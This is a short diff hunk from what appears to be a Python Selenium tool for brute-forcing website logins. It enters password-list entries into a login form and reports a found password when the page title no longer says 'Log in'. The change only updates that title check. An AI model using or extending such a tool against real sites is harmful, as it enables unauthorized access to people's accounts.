@@ -93,7 +93,7 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 Sel_pas.send_keys(line)
 
                 #the program terminates after the coreect user and password is found
-                if "Sign in" not in browser.title: #this line should be written according to the website being used
+                if "Log in" not in browser.title: #this line should be written according to the website being used
                     print(color.BLUE + '------------------------')
                     print(color.BLUE + 'Password found: ' + color.GREEN + line.strip() + color.BLUE + ' for user: ' + color.GREEN + username.strip())
                       
